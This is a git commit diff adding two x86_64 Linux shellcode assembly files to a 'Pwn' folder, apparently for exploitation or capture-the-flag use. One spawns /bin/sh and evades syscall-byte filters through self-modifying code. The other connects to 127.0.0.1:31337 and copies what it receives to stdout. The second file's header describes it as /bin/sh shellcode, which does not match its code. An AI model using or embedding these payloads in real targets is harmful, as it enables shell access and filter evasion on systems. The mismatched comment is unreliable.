808b9f64b6c249702ac846c8a2785b8ed6e23965
Rinzlller <djsmaug2002@gmail.com>
2023-01-30 18:39:53 +0300

    socket.asm + binsh_noSyscall.asm

---
+++ Pwn/binsh_noSyscall.asm
@@ -0,0 +1,28 @@
+BITS 64
+; Author Rinzler - l33tim Team
+; /bin/sh without syscall Linux x86_64 Shellcode
+; Shellcode size 35 bytes
+global _start
+
+_start:
+	jmp _push_syscall
+
+_edit_syscall
+	pop rcx
+	xor byte [rcx], 0x1
+	push 59
+	pop rax
+	cdq
+	push rdx
+	mov rdi, 0x68732f2f6e69622f
+	push rdi
+	push rsp
+	pop rdi
+	xor esi, esi
+	call rcx
+
+_push_syscall:
+	call _edit_syscall
+
+_syscall:	db 0eh
+			db 05h 
---
+++ Pwn/socket.asm
@@ -0,0 +1,46 @@
+BITS 64
+; Author Rinzler - l33tim Team
+; /bin/sh Linux x86_64 Shellcode
+; Shellcode size 22 bytes
+global _start
+
+_start:
+	; syscall socket
+	push 0x29
+	pop rax
+	cdq
+	push 0x2
+	pop rdi
+	push 0x1
+	pop rsi
+	syscall
+
+	; syscall connect
+	push rax
+	pop rdi
+	push 0x2a
+	pop rax
+	push 0x10
+	pop rdx
+	mov rsi, 0x0100007f697a0002	; 127.0.0.1:31337
+	push rsi
+	push rsp
+	pop rsi
+	syscall
+
+	; syscall read
+	sub sp, 0xfff
+	push rsp
+	pop rsi
+	cdq
+	mov dx, 0xfff	; size to read
+	syscall
+
+	; syscall write
+	push 1
+	pop rdi	; set stdout fd = 1
+	push rax
+	pop rdx
+	push 1
+	pop rax
+	syscall
